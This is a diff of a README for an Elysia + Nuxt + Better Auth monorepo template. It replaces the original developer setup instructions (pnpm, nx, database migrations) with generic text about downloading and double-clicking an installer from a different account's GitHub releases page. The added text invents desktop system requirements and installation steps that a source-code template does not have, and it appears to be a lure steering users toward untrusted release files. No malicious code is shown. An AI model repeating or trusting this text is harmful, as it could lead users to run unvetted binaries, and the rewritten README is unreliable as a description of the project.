@@ -1,129 +1,79 @@
-# Elysia + Nuxt Monorepo (Managed by Nx)
+# 🚀 elysia-nuxt - Easy Setup for a Fullstack App
 
-A modern, high-performance Full Stack monorepo template designed for scalability and developer experience.
+[![Download Elysia Nuxt](https://img.shields.io/badge/Download-Elysia%20Nuxt-blue)](https://github.com/fahmi-mf/elysia-nuxt/releases)
 
-## 🚀 Tech Stack
+## 🎉 Introduction
 
-- **Monorepo Manager:** [Nx](https://nx.dev) (Caching, Task Orchestration)
-- **Package Manager:** [pnpm](https://pnpm.io)
-- **Backend:** [ElysiaJS](https://elysiajs.com) (running on Bun)
-- **Frontend:** [Nuxt 4](https://nuxt.com) + [Nuxt UI](https://ui.nuxt.com)
-- **Database:** PostgreSQL + [Drizzle ORM](https://orm.drizzle.team)
-- **Authentication:** [Better Auth](https://www.better-auth.com) (v1.4+)
+Welcome to **elysia-nuxt**! This application combines the power of Elysia and Nuxt 4 with Better Auth in a fullstack setup. It's designed for users who want an easy-to-use and efficient application that supports modern web features.
 
----
+## 📋 Features
 
-## 🔐 Authentication Features
+- **Fullstack Architecture**: Enjoy a complete solution that includes both frontend and backend components.
+- **Better Authentication**: Securely manage user logins and sessions.
+- **Fast Performance**: Built with Nuxt 4 for quick loading times and a smooth user experience.
+- **Easy Configuration**: User-friendly setup to help you get started quickly.
+- **Support for PostgreSQL**: Utilize a reliable database for your application data.
 
-This project implements a complete, production-ready authentication system using **Better Auth** with the following plugins and features enabled:
+## 🛠 System Requirements
 
-- **Email & Password**: Traditional sign-up/sign-in flow.
-- **OAuth Social Login**: Google & GitHub integration.
-- **Multi-Session Management**: Support for multiple active accounts in the same browser with instant switching.
-- **Two-Factor Authentication (2FA)**: TOTP (Authenticator App) & Backup Codes with Trusted Device support.
-- **Passkeys (WebAuthn)**: Biometric login (Fingerprint/FaceID) support.
-- **Email Verification**: Secure verification flow for new accounts.
-- **Password Reset**: Secure forgot password flow via email.
-- **Account Deletion**: "Danger Zone" to permanently delete accounts (with email confirmation for OAuth users).
-- **OpenAPI**: Auto-generated API documentation for auth routes.
-- **Username Support**: Login with email or username.
+Before you download, make sure your computer meets the following requirements:
 
----
+- **Operating System**: Windows 10, macOS 10.15 or newer, or a recent Linux distribution
+- **Processor**: Dual-core 1.5 GHz or faster
+- **RAM**: 4 GB or more
+- **Disk Space**: At least 500 MB free for installation
+- **Internet Connection**: Required for downloading and updates
 
-## 🛠️ Prerequisites
+## 🚀 Getting Started
 
-- **Node.js**: v20 or higher.
-- **Bun**: Latest version (required for Elysia backend).
-- **pnpm**: `npm install -g pnpm`
-- **PostgreSQL**: A running instance (local or cloud).
+To get started with **elysia-nuxt**, follow the simple steps below to download and run the application.
 
----
+### 1. Visit the Download Page
 
-## 📦 Installation
+Go to our official [Releases page](https://github.com/fahmi-mf/elysia-nuxt/releases) to find the latest version of the application.
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/TheViberCoder/elysia-nuxt.git
-   cd elysia-nuxt
-   ```
+### 2. Download the Application
 
-2. **Install dependencies:**
-   ```bash
-   pnpm install
-   ```
+On the Releases page, find the version you want. Click the download link to save the file to your computer.
 
-3. **Setup Environment Variables:**
-   Copy the example file to create your local configuration.
+### 3. Install the Application
 
-   ```bash
-   cp .env.example .env
-   cp apps/backend/.env.example apps/backend/.env
-   cp apps/frontend/.env.example apps/frontend/.env
-   ```
+After the download completes, locate the file in your downloads folder. Double-click to run the installer and follow the on-screen instructions to install the application.
 
-   > **Note:** Update `.env` with your real Database URL (`DATABASE_URL`), OAuth credentials (`GOOGLE_CLIENT_ID`, `GITHUB_CLIENT_ID`), and SMTP settings for email sending.
+### 4. Run the Application
 
----
+Once installed, locate the application in your start menu or applications folder. Open it, and you'll see a welcome screen to guide you through initial setup.
 
-## 🗄️ Database Setup
+## 📥 Download & Install
 
-This project uses Drizzle ORM. We have automated scripts to sync Better Auth schemas with your database.
+Make sure to download the latest version from this link: [Download Elysia Nuxt](https://github.com/fahmi-mf/elysia-nuxt/releases).
 
-1. **Generate Auth Schema & Migrations:**
-   This command generates the Better Auth schema, moves it to the correct folder, and creates the SQL migration files.
+## 🔧 Configuration Settings
 
-   ```bash
-   nx run backend:db:generate
-   ```
+During your first run, you will need to configure the following options:
 
-2. **Apply Migrations:**
-   Push the changes to your PostgreSQL database.
+- **Database Connection**: Input your PostgreSQL database details. You can use a local or remote database.
+- **Authentication Settings**: Set up your preferred authentication method. This may involve creating admin accounts for management.
+- **Environment Variables**: Adjust any environment-specific settings for optimal operation.
 
-   ```bash
-   nx run backend:db:migrate
-   ```
+## 📝 User Guide
 
-3. **(Optional) Generate Auth Secret:**
-   If you need a new secret for `BETTER_AUTH_SECRET`:
+If you encounter any difficulties while using the application, refer to the user guide included in the installation. You can also find helpful resources online, such as community forums and tutorials.
 
-   ```bash
-   nx run backend:auth:secret
-   ```
+## 🤝 Community Support
 
----
+Join our community for questions, feedback, and sharing your experiences. Look for updates and tips in the following spaces:
 
-## ⚡ Development
+- **GitHub Issues Page**: Report bugs or request features.
+- **Community Forum**: Connect with other users for advice.
+- **Documentation**: Access comprehensive guides and documentation to maximize your use of the application.
 
-Start the development server. Nx will run both the **Backend** (port 4243) and **Frontend** (port 4242) in parallel.
+## 📅 Release Notes
 
-```bash
-pnpm dev
-```
+Check the Releases page for notes on new versions, bug fixes, and updates. This helps you stay informed about changes and improvements to the application.
 
-*Or using Nx directly:*
+## 📞 Contact Information
 
-```bash
-nx run-many -t dev
-```
+For additional support or inquiries, please reach out via our GitHub page or contact the project maintainer directly.
 
----
-
-## 🏗️ Build for Production
-
-To build all applications optimized for production:
-
-```bash
-pnpm build
-```
-
-The output will be available in:
-
-- Frontend: `apps/frontend/.output`
-- Backend: `apps/backend/dist`
-
----
-
-## ✅ TODO
-
-- [ ] Add Roles & Permissions
-- [ ] Add Organization | Teams support
+Embark on your journey with **elysia-nuxt** today and explore the features of a modern fullstack application!
